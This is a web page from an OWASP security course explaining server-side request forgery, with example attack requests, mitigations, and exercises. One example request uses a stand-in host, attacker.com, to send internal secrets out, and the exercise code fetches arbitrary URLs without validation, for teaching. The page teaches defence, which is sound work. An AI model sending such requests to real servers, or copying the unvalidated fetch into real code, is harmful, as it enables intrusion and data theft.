<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A10:2021 - Server-Side Request Forgery (SSRF)</title>

    <link rel="alternate" href="https://campusempresa.com/owasp/tema-18" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/owasp/tema-18" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/owasp/tema-18" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body>
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo_header.png" style="visibility:hiddenxx;"></a>
			</h1>
		</div>
		<div class="col-4 p-0 text-end">
			<h2 id="main_title"><cite>Building today's and tomorrow's society</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
													<b id="lit_lang_es" class="px-2">EN</b>
				|
				<a href="https://campusempresa.com/owasp/tema-18" class="px-2">ES</a></b>
				|
				<a href="https://campusempresa.cat/owasp/tema-18" class="px-2">CA</a>
					</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/objective">The Project</a>
				<a href="/about">About Us</a>
				<a href="/contribute">Contribute</a>
				<a href="/donate">Donations</a>
				<a href="/licence">License</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content"><div class='content'></div><h1>Introduction</h1>
<div class='content'><p>Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can cause the server to make HTTP requests to an arbitrary domain. This vulnerability can allow attackers to access internal resources, exfiltrate sensitive data, and perform other malicious actions.</p>
</div><h1>Key Concepts</h1>
<div class='content'><ul>
<li><strong>Definition of SSRF</strong>: Vulnerability that allows an attacker to manipulate the requests that a server makes to other servers.</li>
<li><strong>Impact</strong>: Can lead to the exposure of internal data, remote command execution, and other malicious activities.</li>
<li><strong>Attack Vectors</strong>: Manipulated URLs, unvalidated input parameters, accessible internal services.</li>
</ul>
</div><h1>Examples of SSRF</h1>
<div class='content'></div><h2>Example 1: Manipulated HTTP Request</h2>
<div class='content'><p>An attacker can manipulate an HTTP request to make the server access an internal URL:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("R0VUIC9mZXRjaD91cmw9aHR0cDovL2ludGVybmFsLXNlcnZpY2UubG9jYWwvYWRtaW4KSG9zdDogdnVsbmVyYWJsZS13ZWJzaXRlLmNvbQ=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>GET /fetch?url=http://internal-service.local/admin
Host: vulnerable-website.com</pre></div><div class='content'><p>In this case, the server could make a request to <code>http://internal-service.local/admin</code>, exposing sensitive information.</p>
</div><h2>Example 2: Data Exfiltration</h2>
<div class='content'><p>An attacker can use SSRF to exfiltrate sensitive data:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("R0VUIC9mZXRjaD91cmw9aHR0cDovL2F0dGFja2VyLmNvbT9kYXRhPWh0dHA6Ly9pbnRlcm5hbC1zZXJ2aWNlLmxvY2FsL3NlY3JldApIb3N0OiB2dWxuZXJhYmxlLXdlYnNpdGUuY29t"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>GET /fetch?url=http://attacker.com?data=http://internal-service.local/secret
Host: vulnerable-website.com</pre></div><div class='content'><p>The server could send sensitive data to <code>http://attacker.com</code>.</p>
</div><h1>Mitigation of SSRF</h1>
<div class='content'><ul>
<li><strong>Input Validation</strong>: Validate and sanitize all inputs used to construct URLs.</li>
<li><strong>URL Whitelisting</strong>: Implement a whitelist of allowed URLs to prevent the server from accessing unauthorized resources.</li>
<li><strong>Network Restrictions</strong>: Configure firewall rules to limit the server's access to internal and external resources.</li>
<li><strong>Authentication and Authorization</strong>: Ensure that internal requests require proper authentication and authorization.</li>
</ul>
</div><h1>Practical Exercise</h1>
<div class='content'></div><h2>Exercise 1: Identification of SSRF</h2>
<div class='content'><p>Given the following code snippet, identify possible SSRF vulnerabilities:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("aW1wb3J0IHJlcXVlc3RzCgpkZWYgZmV0Y2hfZGF0YSh1cmwpOgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgcmV0dXJuIHJlc3BvbnNlLmNvbnRlbnQKCmRhdGEgPSBmZXRjaF9kYXRhKCJodHRwOi8vZXhhbXBsZS5jb20vZGF0YSIpCnByaW50KGRhdGEp"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>import requests

def fetch_data(url):
    response = requests.get(url)
    return response.content

data = fetch_data(&quot;http://example.com/data&quot;)
print(data)</pre></div><div class='content'></div><h2>Exercise 2: Mitigation of SSRF</h2>
<div class='content'><p>Modify the above code to mitigate the SSRF vulnerability using a whitelist of allowed URLs:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("aW1wb3J0IHJlcXVlc3RzCgpBTExPV0VEX1VSTFMgPSBbImh0dHA6Ly9leGFtcGxlLmNvbS9kYXRhIl0KCmRlZiBmZXRjaF9kYXRhKHVybCk6CiAgICBpZiB1cmwgbm90IGluIEFMTE9XRURfVVJMUzoKICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJVUkwgbm90IGFsbG93ZWQiKQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgcmV0dXJuIHJlc3BvbnNlLmNvbnRlbnQKCmRhdGEgPSBmZXRjaF9kYXRhKCJodHRwOi8vZXhhbXBsZS5jb20vZGF0YSIpCnByaW50KGRhdGEp"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>import requests

ALLOWED_URLS = [&quot;http://example.com/data&quot;]

def fetch_data(url):
    if url not in ALLOWED_URLS:
        raise ValueError(&quot;URL not allowed&quot;)
    response = requests.get(url)
    return response.content

data = fetch_data(&quot;http://example.com/data&quot;)
print(data)</pre></div><div class='content'></div><h1>Conclusion</h1>
<div class='content'><p>SSRF is a critical vulnerability that can have severe consequences if not properly mitigated. It is essential for developers and IT professionals to understand how to identify and prevent SSRF through input validation, the use of whitelists, and the implementation of network restrictions. By following these practices, the risk of SSRF attacks can be significantly reduced, protecting systems and sensitive data.</p>
</div></div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Advertising</h1>
			<p>This space is reserved for advertising.</p>
			<p>If you want to be a sponsor, contact us to include links in this area: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Thank you for collaborating!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. All rights reserved</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Accept</a>
    <a href="/cookies">More Information</a>
</div>	

	</div>    
</body>
</html>
